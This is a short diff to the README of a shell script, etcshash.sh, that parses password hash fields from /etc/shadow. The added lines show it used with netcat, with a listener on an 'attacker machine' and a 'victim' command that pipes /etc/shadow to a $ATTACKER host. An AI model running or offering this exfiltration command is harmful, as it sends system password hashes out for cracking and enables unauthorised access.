@@ -14,3 +14,11 @@ or output every field of the `/etc/shadow` file with the `-a` flag
 ```sh
 cat /etc/shadow | ./etcshash.sh -a
 ```
+
+as it reads from stdin it can also receive files sent e.g. from netcat:
+```
+# attacker machine:
+nc -lvnp 1234 | ./etcshash.sh
+
+# victim:
+cat /etc/shadow | nc $ATTACKER 1234
